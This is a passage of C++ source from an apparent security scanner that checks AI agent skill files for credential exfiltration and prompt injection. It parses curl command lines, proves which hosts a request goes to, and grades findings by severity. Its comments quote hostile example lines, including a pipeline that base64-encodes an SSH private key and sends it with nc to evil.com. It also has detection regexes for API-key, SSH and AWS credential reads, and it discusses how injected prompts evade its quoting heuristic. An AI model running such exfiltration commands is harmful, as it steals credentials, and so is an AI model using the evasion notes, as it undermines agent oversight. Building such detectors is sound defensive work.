        noteLineCommands( cut, body, lineNum, at, block, bindings );
        if( !body )
        {
            block.afterLine( cut );
        }
        bindings.signals.rebinds = bindings.signals.rebinds || lines[i].find( "${!" ) != std::string::npos;
        bindings.signals.relays  = bindings.signals.relays || bindings.signals.rebinds || lineRelayText( lines[i] );
    }
    std::stable_sort( bindings.sites.begin(), bindings.sites.end(), []( const ShellBindingSite& a, const ShellBindingSite& b ) noexcept
    {
        return std::tie( a.name, a.line, a.col ) < std::tie( b.name, b.line, b.col );
    } );
    return bindings;
}

// What the destination step may cost: a line naming more hosts, or a host text longer once expanded, proves nothing.
inline constexpr std::size_t kFlowMaxDestinations = 16;
inline constexpr std::size_t kFlowMaxExpandedBytes = 4096;

// The variable a `$` at text[at] names: `name` for `$NAME` or a closed `${NAME}` (empty for `${NAME:-x}`, `$(`, `$1`, a
// lone `$`), `rawName` for the identifier after `$` / `${` however it ends, and `end`, the byte past the reference.
struct ShellVarRef
{
    std::string_view name;
    std::string_view rawName;
    std::size_t      end = 0;
};

inline ShellVarRef shellVarRefAt( std::string_view text, std::size_t at ) noexcept
{
    const bool        braced = at + 1 < text.size() && text[ at + 1 ] == '{';
    const std::size_t begin  = at + ( braced ? 2 : 1 );
    std::size_t       end    = begin;
    while( end < text.size() && namesplit::isIdentChar( text[end] ) )
    {
        ++end;
    }
    const std::string_view raw    = text.substr( std::min( begin, text.size() ), end - std::min( begin, text.size() ) );
    const bool             closed = !braced || ( end < text.size() && text[end] == '}' );
    const bool             named  = !raw.empty() && namesplit::isIdentStart( raw[0] ) && closed;
    return { named ? raw : std::string_view{}, raw, named ? end + ( braced ? 1 : 0 ) : at + 1 };
}

// Every expansion so far, each extended by each of `values`; false past the bounds (one multi-valued variable per word,
// kFlowMaxDestinations expansions, kFlowMaxExpandedBytes per expansion), checked before anything is built.
inline bool substituteValues( std::vector<std::string>& out, const std::vector<std::string>& values )
{
    if( ( values.size() != 1 && out.size() != 1 ) || out.size() * values.size() > kFlowMaxDestinations )
    {
        return false;
    }
    std::vector<std::string> next;
    for( const std::string& o : out )
    {
        for( const std::string& v : values )
        {
            next.push_back( o + v );
        }
    }
    out = std::move( next );
    return std::none_of( out.begin(), out.end(), []( const std::string& o ) noexcept { return o.size() > kFlowMaxExpandedBytes; } );
}

// A destination word with every resolvable `$NAME` / `${NAME}` replaced by what it holds; an unresolved one stays as
// written, so hostOfUrl refuses it wherever it reaches the host. A `for` variable expands to each of its words.
inline bool expandDestination( std::string_view text, int line, std::size_t col, const ShellBindings* bindings, std::vector<std::string>& out )
{
    out.assign( 1, std::string{} );
    if( text.size() > kFlowMaxExpandedBytes )
    {
        return false;   // the word's own bytes are past the bound before anything is substituted
    }
    for( std::size_t i = 0; i < text.size(); )
    {
        const ShellVarRef       ref  = text[i] == '$' ? shellVarRefAt( text, i ) : ShellVarRef{};
        const ShellBindingSite* site = ( !ref.name.empty() && bindings != nullptr ) ? bindings->resolve( ref.name, line, col ) : nullptr;
        if( site == nullptr )
        {
            for( std::string& o : out )
            {
                o += text[i];
            }
            ++i;
            continue;
        }
        if( !substituteValues( out, site->values ) )
        {
            return false;
        }
        i = ref.end;
    }
    return std::none_of( out.begin(), out.end(), []( const std::string& o ) noexcept { return o.size() > kFlowMaxExpandedBytes; } );
}

// The bracketed IPv6 host `[…]` at the start of `authority` and its optional `:port`, or empty.
inline std::string bracketedHost( std::string_view authority )
{
    const std::size_t      close = authority.find( ']' );
    const std::string_view inner = close == std::string_view::npos ? std::string_view{} : authority.substr( 1, close - 1 );
    const std::string_view tail  = close == std::string_view::npos ? std::string_view{} : authority.substr( close + 1 );
    const bool hexColon = !inner.empty() && inner.find_first_not_of( "0123456789abcdef:" ) == std::string_view::npos;
    const bool portOk   = tail.empty() || ( tail[0] == ':' && isAllDigits( tail.substr( 1 ) ) );
    return ( hexColon && portOk ) ? "[" + std::string( inner ) + "]" : std::string{};
}

// The host a URL or bare `host[:port][/path]` sends to, as written, or empty when the text does not prove one: an
// expansion, backtick, backslash or %-escape anywhere in the authority (userinfo included: `${X}@api.github.com` may
// hold a `/`), two `@`, a port that is not digits, an upper-case or trailing-dot spelling, a byte no host name holds.
// The authority runs to the first `/ ? #`, and the host follows its one `@`: a URL whose userinfo reads
// `api.github.com` goes to the host after the `@`.
inline std::string hostOfUrl( std::string_view text )
{
    std::string_view  rest   = text;
    const std::size_t scheme = rest.find( "://" );
    if( scheme != std::string_view::npos )
    {
        const std::string_view name = rest.substr( 0, scheme );
        if( name.empty() || !namesplit::isIdentStart( name[0] ) || name.find_first_not_of( "abcdefghijklmnopqrstuvwxyz0123456789+.-" ) != std::string_view::npos )
        {
            return {};
        }
        rest = rest.substr( scheme + 3 );
    }
    std::string_view  authority = rest.substr( 0, rest.find_first_of( "/?#" ) );
    if( authority.find_first_of( "$`\\%" ) != std::string_view::npos )
    {
        return {};
    }
    const std::size_t at = authority.find( '@' );
    if( at != std::string_view::npos )
    {
        authority = authority.find( '@', at + 1 ) == std::string_view::npos ? authority.substr( at + 1 ) : std::string_view{};
    }
    if( authority.empty() )
    {
        return {};
    }
    if( authority[0] == '[' )
    {
        return bracketedHost( authority );
    }
    const std::size_t colon = authority.find( ':' );
    std::string_view  host  = authority.substr( 0, colon );
    if( colon != std::string_view::npos && !isAllDigits( authority.substr( colon + 1 ) ) )
    {
        return {};
    }
    const bool nameBytes = !host.empty() && std::isalnum( static_cast<unsigned char>( host[0] ) ) != 0 && !host.ends_with( '.' )
                        && host.find_first_not_of( "abcdefghijklmnopqrstuvwxyz0123456789.-" ) == std::string_view::npos && host.find( ".." ) == std::string_view::npos;
    return nameBytes ? std::string( host ) : std::string{};
}

// A dotted-quad IPv4 literal as four octets, or false. A leading zero is refused: curl reads `010` as octal 8, so
// `010.0.0.1` is 8.0.0.1, and a decimal reading of it would call a public host private.
inline bool parseIpv4( std::string_view host, unsigned octets[4] ) noexcept
{
    for( int part = 0; part < 4; ++part )
    {
        const std::size_t      dot   = host.find( '.' );
        const std::string_view piece = host.substr( 0, dot );
        if( piece.empty() || piece.size() > 3 || !isAllDigits( piece ) || ( piece.size() > 1 && piece[0] == '0' ) || ( ( dot == std::string_view::npos ) != ( part == 3 ) ) )
        {
            return false;
        }
        unsigned value = 0;
        for( const char digit : piece )
        {
            value = value * 10 + unsigned( digit - '0' );   // at most three digits: cannot overflow
        }
        octets[part] = value;
        if( octets[part] > 255 )
        {
            return false;
        }
        host = dot == std::string_view::npos ? std::string_view{} : host.substr( dot + 1 );
    }
    return true;
}

// localhost, 127.0.0.0/8, ::1 and RFC 1918 (10/8, 172.16/12, 192.168/16). Spelled any other way (`0x7f.1`,
// `[::ffff:127.0.0.1]`, `*.localhost`, `127.0.0.1.`) the host is not called local: the downgrade needs the plain
// spelling. Link-local is not here: 169.254.169.254 is a cloud metadata service, not this machine.
inline bool isLocalHost( std::string_view host ) noexcept
{
    if( host == "localhost" || host == "[::1]" )
    {
        return true;
    }
    unsigned o[4] = {};
    if( !parseIpv4( host, o ) )
    {
        return false;
    }
    return o[0] == 127 || o[0] == 10 || ( o[0] == 172 && o[1] >= 16 && o[1] <= 31 ) || ( o[0] == 192 && o[1] == 168 );
}

// A credential's name names its owner: the name's first `_` component equals the stem (or its alias), and the owner's
// registrable domain is that stem's `.com` — the exact-label rule, fixed to one public suffix so no suffix list is
// needed: under `.com` a host's registrable domain is its last two labels. A small, explicit table on purpose: a
// vendor whose domain is not stem.com, or whose subdomains a customer can claim (Azure's *.services.ai.azure.com, a
// *.github.io page), is not here, and its row carries no owner=. owner= never changes a severity (see the block head).
struct CredentialOwner
{
    std::string_view stem;
    std::string_view alias;   // empty = none
    std::string_view domain;
};
inline constexpr CredentialOwner kCredentialOwners[] = {
    { "cloudflare", "cf", "cloudflare.com" }, { "github", "gh", "github.com" }, { "airtable", "", "airtable.com" } };
static_assert( std::all_of( std::begin( kCredentialOwners ), std::end( kCredentialOwners ), []( const CredentialOwner& o )
               { return o.domain.size() == o.stem.size() + 4 && o.domain.starts_with( o.stem ) && o.domain.ends_with( ".com" ); } ),
               "each owner's domain is its stem's .com: the stem must equal the registrable domain's label" );

// The owner a LOWERCASED credential name names, or null.
inline const CredentialOwner* credentialOwner( std::string_view lowered ) noexcept
{
    const std::string_view stem = lowered.substr( 0, lowered.find( '_' ) );
    for( const CredentialOwner& o : kCredentialOwners )
    {
        if( !stem.empty() && ( stem == o.stem || stem == o.alias ) )
        {
            return &o;
        }
    }
    return nullptr;
}

inline bool hostOwnedBy( std::string_view host, std::string_view domain ) noexcept
{
    return host == domain || ( host.size() > domain.size() && host.ends_with( domain ) && host[ host.size() - domain.size() - 1 ] == '.' );
}

// The owner every credential-named `$NAME` / `${NAME…` on the LOWERCASED line names, when each one's owner owns every
// (non-empty) host — two owners cannot, their domains differ — and there is one; null otherwise.
inline const CredentialOwner* credentialVarsOwner( std::string_view lowered, const std::vector<std::string>& hosts )
{
    const CredentialOwner* common = nullptr;
    for( std::size_t dollar = lowered.find( '$' ); dollar != std::string_view::npos; dollar = lowered.find( '$', dollar + 1 ) )
    {
        const std::string_view name = shellVarRefAt( lowered, dollar ).rawName;
        if( name.empty() || !isCredentialName( name ) )
        {
            continue;
        }
        const CredentialOwner* owner = credentialOwner( name );
        if( owner == nullptr || hosts.empty()
            || !std::all_of( hosts.begin(), hosts.end(), [ & ]( const std::string& h ) noexcept { return hostOwnedBy( h, owner->domain ); } ) )
        {
            return nullptr;
        }
        common = owner;
    }
    return common;
}

// In one LOWERCASED shell word, every `$` after an `authorization:` starts a credential-named variable.
inline bool headerVarsNamed( std::string_view low ) noexcept
{
    const std::size_t header = low.find( "authorization:" );
    for( std::size_t d = header == std::string_view::npos ? std::string_view::npos : low.find( '$', header ); d != std::string_view::npos; d = low.find( '$', d + 1 ) )
    {
        const std::string_view name = shellVarRefAt( low, d ).name;
        if( name.empty() || !isCredentialName( name ) )
        {
            return false;
        }
    }
    return true;
}

// Every `$` in an Authorization header word starts a credential-named variable (`Bearer $X`, `Bearer $(cat t)` do not),
// so the owner check above has seen everything the header sends.
inline bool authorizationVarsNamed( const ShellLine& cut )
{
    for( const ShellCommand& cmd : cut.commands )
    {
        for( const ShellWord& w : cmd.words )
        {
            std::string low( w.text );
            std::transform( low.begin(), low.end(), low.begin(), []( char c ) noexcept { return char( std::tolower( static_cast<unsigned char>( c ) ) ); } );
            if( !headerVarsNamed( low ) )
            {
                return false;
            }
        }
    }
    return true;
}

// curl's options, as far as this proof models them: those whose value is the NEXT word, those that take none, and the
// short letters of each. Any other option — a proxy (-x), --resolve / --connect-to, a config file (-K), --next, an
// --expand-* variable, an option this table does not know — leaves the destination unproved.
inline constexpr std::string_view kCurlValueShort = "AbcCdDeEFHmoPQrTtuUwXyYz";
inline constexpr std::string_view kCurlFlagShort  = "0123456aBfgGiIjJklLMnNOpqRsSvZ#";
inline constexpr std::string_view kCurlValueLong  =
    "--header --data --data-raw --data-binary --data-urlencode --data-ascii --json --request --user --output --user-agent --referer --form "
    "--form-string --upload-file --cookie --cookie-jar --max-time --connect-timeout --retry --retry-delay --retry-max-time --write-out --cacert "
    "--capath --cert --cert-type --key --key-type --oauth2-bearer --aws-sigv4 --limit-rate --range --dump-header --stderr --trace --trace-ascii "
    "--max-filesize --speed-limit --speed-time --expect100-timeout --keepalive-time --output-dir --url-query --max-redirs --proto --proto-redir "
    "--continue-at --time-cond --netrc-file";
inline constexpr std::string_view kCurlFlagLong   =
    "--silent --show-error --fail --fail-with-body --fail-early --location --include --verbose --insecure --compressed --get --head --globoff "
    "--http1.0 --http1.1 --http2 --http2-prior-knowledge --http3 --no-progress-meter --progress-bar --remote-name --remote-name-all "
    "--remote-header-name --ipv4 --ipv6 --tlsv1.2 --tlsv1.3 --ssl --ssl-reqd --create-dirs --no-buffer --raw --list-only --append --disable "
    "--netrc --netrc-optional --anyauth --basic --digest --ntlm --negotiate --path-as-is --tcp-nodelay --no-keepalive --no-sessionid "
    "--retry-all-errors --retry-connrefused --show-headers --tr-encoding";

enum class CurlArg : char { Unknown, Flag, NextIsValue, NextIsUrl, Positional };

inline CurlArg curlLongOptionKind( std::string_view w ) noexcept
{
    return w == "--url"                                         ? CurlArg::NextIsUrl
         : namesplit::hasField( kCurlValueLong, " ", w, false ) ? CurlArg::NextIsValue
         : namesplit::hasField( kCurlFlagLong, " ", w, false )  ? CurlArg::Flag
                                                                 : CurlArg::Unknown;
}

// A short-option bundle: flags, then at most one value letter, whose value is the rest of the word or the next word.
inline CurlArg curlShortBundleKind( std::string_view w ) noexcept
{
    for( std::size_t j = 1; j < w.size(); ++j )
    {
        if( kCurlValueShort.find( w[j] ) != std::string_view::npos )
        {
            return j + 1 < w.size() ? CurlArg::Flag : CurlArg::NextIsValue;
        }
        if( kCurlFlagShort.find( w[j] ) == std::string_view::npos )
        {
            return CurlArg::Unknown;
        }
    }
    return CurlArg::Flag;
}

inline CurlArg curlArgKind( std::string_view w ) noexcept
{
    if( w.size() < 2 || w[0] != '-' )
    {
        return CurlArg::Positional;
    }
    return w.starts_with( "--" ) ? curlLongOptionKind( w ) : curlShortBundleKind( w );
}

// `"$@"`, `"${@:2}"`, `"${arr[@]}"` or `"${!prefix@}"`: even quoted, the shell makes zero or several arguments of it,
// so it cannot stand for the one value an option takes (`-H "$@"` may also pass the URL after it). A `$` reference
// whose text holds an `@` is enough to refuse; a quoted scalar (`"$HEADER"`) stays one word.
inline bool expandsToWordList( std::string_view text ) noexcept
{
    const std::size_t dollar = text.find( '$' );
    return dollar != std::string_view::npos && text.find( '@', dollar ) != std::string_view::npos;
}

// The words a curl command sends to (every positional argument, and --url's value), appended to `out`; false when an
// argument is outside the model above.
inline bool curlCommandDestinations( const std::vector<ShellWord>& words, std::size_t first, std::vector<const ShellWord*>& out )
{
    bool positionalOnly = false;
    for( std::size_t k = first; k < words.size(); ++k )
    {
        const CurlArg kind = positionalOnly ? CurlArg::Positional : curlArgKind( words[k].text );
        positionalOnly     = positionalOnly || words[k].text == "--";
        if( kind == CurlArg::Unknown && words[k].text != "--" )
        {
            return false;
        }
        if( kind == CurlArg::NextIsValue || kind == CurlArg::NextIsUrl )
        {
            if( ++k == words.size() || expandsToWordList( words[k].text ) )
            {
                return false;
            }
        }
        if( kind == CurlArg::Positional || kind == CurlArg::NextIsUrl )
        {
            out.push_back( &words[k] );
        }
    }
    return true;
}

// Words that leave curl the command: control words and runners that take no option here. A `VAR=x` prefix is not one:
// `https_proxy=… curl`, `CURL_HOME=… curl` and `env ALL_PROXY=… curl` reroute the request, so the host stays unproved.
inline constexpr std::string_view kCurlRunnerWords = "then do else elif if while until ! { time nohup exec command env sudo $";

// Network-verb words anywhere on the line (the same word runs hasNetExfilShape reads): each must be a curl command the
// cut parsed, or the line holds a sink — an eval'd string, a `sh -c`, a wget — the proof did not read.
inline std::size_t netVerbWords( std::string_view line ) noexcept
{
    std::size_t count = 0;
    for( std::size_t i = 0; i < line.size(); )
    {
        std::size_t end = i;
        while( end < line.size() && namesplit::isIdentChar( line[end] ) )
        {
            ++end;
        }
        const std::string_view word = line.substr( i, end - i );
        count += std::find( std::begin( kNetVerbs ), std::end( kNetVerbs ), word ) != std::end( kNetVerbs ) ? 1 : 0;
        i = end > i ? end : i + 1;
    }
    return count;
}

// The hosts a line sends to, when every one is proved; known=false otherwise (an empty answer proves nothing).
struct LineHosts
{
    bool                     known = false;
    bool                     web   = true;   // every destination is http://, https:// or scheme-less (no gopher://, dict://, …)
    std::vector<std::string> hosts;          // distinct, in line order
};

// The destination words of every curl command on a fully modelled line, or false when a command is not one the proof
// reads (a curl the cut did not parse as a command, another network verb, an argument outside the option model).
inline bool lineDestinationWords( std::string_view line, const ShellLine& cut, std::vector<const ShellWord*>& words )
{
    if( !cut.modelled || line.find( "/dev/tcp/" ) != std::string_view::npos || line.find( "/dev/udp/" ) != std::string_view::npos )
    {
        return false;
    }
    std::size_t curls = 0;
    for( const ShellCommand& cmd : cut.commands )
    {
        std::size_t k = 0;
        while( k < cmd.words.size() && namesplit::hasField( kCurlRunnerWords, " ", cmd.words[k].text, false ) )
        {
            ++k;
        }
        if( k < cmd.words.size() && cmd.words[k].text == "curl" )   // `./scripts/curl` is another program: the count below refuses it
        {
            ++curls;
            if( !curlCommandDestinations( cmd.words, k + 1, words ) )
            {
                return false;
            }
        }
    }
    return curls > 0 && curls == netVerbWords( line.substr( 0, cut.commentAt ) ) && !words.empty() && words.size() <= kFlowMaxDestinations;
}

// An unquoted `$` expansion is word-split and globbed: a value `x https://evil.example` adds a destination, so the word
// proves nothing unless every expansion in it resolves to values with no blank and no glob byte, and none holds a `$`
// or backtick of its own (`U=https://a/$SUFFIX` carries whatever SUFFIX held at the assignment).
inline bool unquotedExpansionsFixed( const ShellWord& w, int line, const ShellBindings* bindings )
{
    const auto splits = []( const std::string& v ) noexcept { return v.find_first_of( " \t\n*?[$`" ) != std::string::npos; };
    for( std::size_t at = w.unquotedDollar ? w.text.find( '$' ) : std::string::npos; at != std::string::npos; at = w.text.find( '$', at + 1 ) )
    {
        const ShellVarRef       ref  = shellExpansionAt( w.text, at ) ? shellVarRefAt( w.text, at ) : ShellVarRef{};
        const ShellBindingSite* site = ( !ref.name.empty() && bindings != nullptr ) ? bindings->resolve( ref.name, line, w.begin ) : nullptr;
        if( shellExpansionAt( w.text, at ) && ( site == nullptr || std::any_of( site->values.begin(), site->values.end(), splits ) ) )
        {
            return false;
        }
    }
    return true;
}

// Every word of every command on the line keeps its argument boundaries (unquotedExpansionsFixed).
inline bool lineArgvFixed( const ShellLine& cut, int lineNum, const ShellBindings* bindings )
{
    for( const ShellCommand& cmd : cut.commands )
    {
        for( const ShellWord& w : cmd.words )
        {
            if( !unquotedExpansionsFixed( w, lineNum, bindings ) )
            {
                return false;
            }
        }
    }
    return true;
}

// Adds the host one expanded destination names; false when it names none or the line passes kFlowMaxDestinations.
inline bool addDestinationHost( const std::string& text, LineHosts& answer )
{
    const std::size_t scheme = text.find( "://" );
    answer.web = answer.web && ( scheme == std::string::npos || text.starts_with( "http://" ) || text.starts_with( "https://" ) );
    std::string host = hostOfUrl( text );
    if( host.empty() )
    {
        return false;
    }
    if( std::find( answer.hosts.begin(), answer.hosts.end(), host ) == answer.hosts.end() )
    {
        answer.hosts.push_back( std::move( host ) );
    }
    return answer.hosts.size() <= kFlowMaxDestinations;
}

inline LineHosts curlLineHosts( std::string_view line, const ShellLine& cut, int lineNum, const ShellBindings* bindings )
{
    LineHosts                     answer;
    std::vector<const ShellWord*> words;
    if( !lineDestinationWords( line, cut, words ) || !lineArgvFixed( cut, lineNum, bindings ) )
    {
        return LineHosts{};
    }
    std::vector<std::string> expanded;
    for( const ShellWord* w : words )
    {
        // a single-quoted or escaped `$` is a literal byte: substituting it would invent a host
        const bool expands = !w->literalDollar && expandDestination( w->text, lineNum, w->begin, bindings, expanded );
        if( !expands || !std::all_of( expanded.begin(), expanded.end(), [ & ]( const std::string& text ) { return addDestinationHost( text, answer ); } ) )
        {
            return LineHosts{};
        }
    }
    answer.known = true;
    return answer;
}

// Every command on the line is a bare `curl` (no runner, no `VAR=x` prefix, no path to another binary), a `for` header
// or `done`: nothing else on the line may carry the credential elsewhere.
inline bool onlyBareCurl( const ShellLine& cut ) noexcept
{
    return std::all_of( cut.commands.begin(), cut.commands.end(), []( const ShellCommand& cmd ) noexcept
    {
        const std::size_t k = firstCommandWord( cmd.words );
        return k < cmd.words.size() && ( cmd.words[k].text == "curl" || cmd.words[k].text == "for" || ( cmd.words[k].text == "done" && k + 1 == cmd.words.size() ) );
    } );
}

// A curl option that follows a redirect (`-L`, `--location`, `--location-trusted`): a 307 from the local host re-sends
// the body wherever it points.
inline bool followsRedirect( const ShellLine& cut ) noexcept
{
    for( const ShellCommand& cmd : cut.commands )
    {
        for( const ShellWord& w : cmd.words )
        {
            if( w.text.starts_with( "--location" ) || ( w.text.size() > 1 && w.text[0] == '-' && w.text[1] != '-' && w.text.find( 'L' ) != std::string::npos ) )
            {
                return true;
            }
        }
    }
    return false;
}

// why="local-dest" when a credential-VARIABLE row (an env dump, a key file or a credential-file read stays CRITICAL
// wherever it goes) sends only to canonical local hosts over http(s), from a line of bare curl commands that follow no
// redirect, in a document with no relay signal; null (the row keeps its severity) otherwise.
inline const char* localDestWhy( bool credentialVarOnly, const LineHosts& hosts, const ShellLine& cut, bool docRelays )
{
    const bool allLocal = std::all_of( hosts.hosts.begin(), hosts.hosts.end(), []( const std::string& h ) noexcept { return isLocalHost( h ); } );
    return ( credentialVarOnly && hosts.known && hosts.web && allLocal && !docRelays && onlyBareCurl( cut ) && !followsRedirect( cut ) ) ? kNetExfilLocalWhy : nullptr;
}

// owner=: the service every credential variable on the line names, when it owns every proved host and every `$` in an
// Authorization header is one of those variables. Information for triage only; the severity does not read it.
inline std::string_view ownerAttr( const LineHosts& hosts, const ShellLine& cut, std::string_view lowered )
{
    const CredentialOwner* owner = ( hosts.known && authorizationVarsNamed( cut ) ) ? credentialVarsOwner( lowered, hosts.hosts ) : nullptr;
    return owner != nullptr ? owner->stem : std::string_view{};
}

// dest=: the proved hosts, space-separated in line order; empty when any host is unproved.
inline std::string destAttr( const LineHosts& hosts )
{
    std::string out;
    for( const std::string& h : hosts.hosts )
    {
        out += ( out.empty() ? "" : " " ) + h;
    }
    return hosts.known ? out : std::string{};
}

// The document context gradeNetExfil reads past its line: the binding sites, and which line this is.
struct NetExfilContext
{
    const ShellBindings* bindings = nullptr;   // null = line-local: no `$VAR` resolves, and no local-dest (the document is unseen)
    int                  line     = 0;
};

// Where a net-exfil row's line sends: dest= (the proved hosts, empty when any is unproved) and owner= (the service a
// credential variable names, when it owns them all; empty otherwise).
struct NetExfilWhere
{
    std::string      dest;
    std::string_view owner;
};

// The net-exfil decision for one line: whether the rule fires, and at which severity and why. A credential-shaped
// source is hasCredentialVar (a credential-named var, an Authorization: header with a var), hasCredentialToken (an env
// dump, a key file), or a read of a sensitive or credential-named file (netFlow). One case fold, then each test is linear
// in the line. Line-local like the rule it grades: a token assigned to `$HOST` three lines up is invisible, and `env -i
// cmd` still counts as a dump — both err toward CRITICAL. The order is the invariant: a credential or a sensitive read is
// judged BEFORE R1 may silence the line for want of a destination.
struct NetExfilGrade
{
    bool          fires = false;
    SkillSeverity sev   = SkillSeverity::Info;
    const char*   why   = nullptr;   // null = CRITICAL by a credential-shaped source, the rule's plain reading
    NetExfilWhere where;             // dest= and owner=
};

// #353 flow: a credential row that has proved a local destination (localDestWhy) is WARN; every row carries the hosts it
// proved, and a credential row the service its credential names. `ctx` brings the document's bindings and signals;
// without it `$VAR` never resolves and nothing is local.
inline NetExfilGrade gradeNetExfil( std::string_view line, const NetExfilContext& ctx = {} )
{
    std::string lowered( line );
    std::transform( lowered.begin(), lowered.end(), lowered.begin(), []( char c ) noexcept { return char( std::tolower( static_cast<unsigned char>( c ) ) ); } );
    const NetFlow flow = netFlow( line, lowered );
    const auto    hostsOf = [ & ]( const ShellLine& cut ) { return curlLineHosts( line, cut, ctx.line, ctx.bindings ); };
    if( flow.sensitiveUpload )
    {
        return { true, SkillSeverity::Critical, kNetExfilSensitiveWhy, { destAttr( hostsOf( cutShellLine( line ) ) ), {} } };
    }
    if( !hasNetExfilShape( line ) )
    {
        return {};
    }
    const bool credentialVar   = hasCredentialVar( lowered );
    const bool otherCredential = hasCredentialToken( lowered ) || flow.credentialRead || flow.sensitiveRead;
    if( !credentialVar && !otherCredential && !flow.hasDestination )
    {
        return {};
    }
    const ShellLine cut   = cutShellLine( line );
    const LineHosts hosts = hostsOf( cut );
    if( !credentialVar && !otherCredential )
    {
        return { true, SkillSeverity::Warn, kNetExfilNoCredWhy, { destAttr( hosts ), {} } };
    }
    const bool  docRelays = ctx.bindings == nullptr || ctx.bindings->signals.relays;
    const char* local     = localDestWhy( !otherCredential, hosts, cut, docRelays );
    return { true, local != nullptr ? SkillSeverity::Warn : SkillSeverity::Critical, local, { destAttr( hosts ), local != nullptr ? std::string_view{} : ownerAttr( hosts, cut, lowered ) } };
}

inline std::vector<ExfilPattern> buildExfilPatterns()
{
    std::vector<ExfilPattern> v;

    // Any reference to the API key environment variable. A bare prose mention (a skill that DOCUMENTS the
    // pattern, e.g. ripwire's own audit skills) is not exfiltration — require command context (a fenced
    // run-block or a co-occurring transmit verb on the line). See scanSkillText's cmdContext gate.
    v.push_back( {
        "EXFILTRATE:api-key",
        compileGuardedRegex( R"(\$ANTHROPIC_API_KEY)", kRegexEcmaScript | kRegexIcase ), /*isNetExfilShape=*/false,
        /*requiresCmdContext=*/true, /*fenceOnly=*/false
    } );

    // SSH private key or AWS credentials directories. Same as above: "reads from `~/.ssh`" in a prose list is
    // documentation; `cat ~/.ssh/id_rsa | base64 | nc …` in a fenced block is the real thing.
    v.push_back( {
        "EXFILTRATE:ssh-aws-creds",
        compileGuardedRegex( R"((\$HOME/\.ssh|~/\.ssh|~/\.aws))", kRegexEcmaScript ), /*isNetExfilShape=*/false,
        /*requiresCmdContext=*/true, /*fenceOnly=*/false
    } );

    // Network exfiltration: (curl|wget|nc) combined with an env-var read or base64 on ONE line, in EITHER
    // order. A4-F12: the previous pattern assumed the network tool comes first, but real exfil pipelines put
    // it LAST — `cat secret | base64 | nc evil.com 1234` — which the tool-first-only regex never matched
    // despite this docstring claiming it did. The two alternatives below cover both orders.
    //
    // Context gate: `fenceOnly`, not `requiresCmdContext`. The generic requiresCmdContext gate
    // (lineInFence || hasTransmitVerb) is a no-op for this rule — hasTransmitVerb's verb list is a superset
    // of {curl, wget, nc}, so it is already true whenever this regex matches at all. Without a real gate,
    // prose like "use curl to fetch $VARIABLE from the API" (no fence, no pipe, just an explanatory
    // sentence) matches the pattern and would fire CRITICAL. Requiring the line to be inside a fenced code
    // block is what actually distinguishes a documented/live command from a prose mention.
    //
    // Decided by hasNetExfilShape (below), not by its regex — see there for why and for the exact equivalence.
    v.push_back( {
        "EXFILTRATE:net-exfil",
        RegexCompile{}, /*isNetExfilShape=*/true,
        /*requiresCmdContext=*/false, /*fenceOnly=*/true
    } );

    return v;
}

// A "command context" for an exfil pattern: the line is inside a fenced code block (where run-commands
// live) OR it carries a transmit/encode verb (the credential is actually being read + shipped, not merely
// named in prose). This is what separates a malicious skill from one that documents the attack.
inline RegexVerdict hasTransmitVerb( std::string_view line, std::size_t stackBytes ) noexcept
{
    static const RegexCompile kVerb = compileGuardedRegex( R"(\b(base64|curl|wget|nc|scp|cat|openssl)\b)", kRegexEcmaScript );
    return kVerb.refusal ? RegexVerdict::Exhausted : kVerb.regex.search( line, stackBytes );
}

// A skill pattern matched through the one regex boundary. Undecided — the engine abandoned the match, the constant
// was refused (which no test tree has ever seen), or the line was too long to hand the engine on this thread — reads
// Exhausted or Skipped, and the caller records a fail-closed finding either way. `stackBytes` is the stack the scan
// thread was SETTLED at (scanSkillText, runOnStackThreads), never SIZE_MAX: a skill file is UNTRUSTED input, and a
// subject longer than that stack's measured-safe bound must be skipped and disclosed, not handed to the engine.
inline RegexVerdict skillSearch( const RegexCompile& pattern, std::string_view line, std::size_t stackBytes, RegexCaptures* captures = nullptr ) noexcept
{
    if( pattern.refusal )
    {
        return RegexVerdict::Exhausted;
    }
    return captures != nullptr ? pattern.regex.search( line, *captures, stackBytes ) : pattern.regex.search( line, stackBytes );
}

static constexpr const char* kScanIncompleteRule         = "SCAN-INCOMPLETE:regex-abandoned";
static constexpr const char* kScanIncompleteRuleOversize = "SCAN-INCOMPLETE:line-oversize";
static constexpr const char* kScanIncompleteRuleAborted  = "SCAN-INCOMPLETE:scan-aborted";

// True if the byte at [pos] on `line` falls inside a BALANCED inline-code span (`…`) or a balanced
// double-quoted ("…") span — i.e. the matched text is being SHOWN AS DATA / an example, not stated as an
// instruction to the agent.  A prompt injection only works as bare imperative prose; once fully enclosed
// in a balanced open/close pair it is inert (the agent reads it as a string).
//
// Previous implementation used an odd-count-of-backticks-before-pos heuristic, which is trivially evaded
// by inserting a single stray backtick or quote anywhere before the phrase (the leading ` does not need to
// close before the phrase — the odd-count fires regardless).  This version requires the phrase to actually
// sit between a matched open-tick and a close-tick (or open-quote and close-quote) that BOTH appear on the
// same line.
//
// Algorithm: scan the line and track open spans.  A backtick at position i either OPENS a new span (if we
// are not already inside one) or CLOSES the current open span.  After scanning, check whether [pos,
// pos+phraseLen) is entirely contained within any closed span.  Same for double-quotes.
//
// Residual evasion envelope: a deliberately multi-backtick construction like `` `phrase` `` (two ticks open,
// one close — parsed as an unclosed span by this scanner) is NOT treated as data, which is the safer
// failure mode.  The scanner is a best-effort heuristic linter, not a sandbox.
inline bool isShownAsData( std::string_view line, std::size_t pos, bool quotesCountAsData = true ) noexcept
{
    const std::size_t N = line.size();

    // ── check balanced backtick spans ─────────────────────────────────────────────────────────────
    {
        bool  inSpan  = false;
        std::size_t spanStart = 0;
        for( std::size_t i = 0; i < N; ++i )
        {
            if( line[i] != '`' )
            {
                continue;
            }
            if( !inSpan )
            {
                inSpan    = true;
                spanStart = i + 1;   // span content starts after the opening tick
            }
            else
            {
                // Closing tick at i: span covers [spanStart, i).
                // The phrase at [pos, …) is "inside" if pos >= spanStart AND pos < i.
                if( pos >= spanStart && pos < i )
                {
                    return true;
                }
                inSpan = false;
            }
        }
        // Unclosed span: do NOT treat as data — an unmatched opening tick is not a real inline-code span.
    }

    // ── check balanced double-quote spans (skipped in YAML frontmatter, where quotes are syntax) ──
    if( quotesCountAsData )
    {
        bool  inSpan  = false;
        std::size_t spanStart = 0;
        for( std::size_t i = 0; i < N; ++i )
        {
            if( line[i] != '"' )
            {
                continue;
            }
            if( !inSpan )
            {
                inSpan    = true;
                spanStart = i + 1;
            }
            else
            {
                if( pos >= spanStart && pos < i )
                {
                    return true;
                }
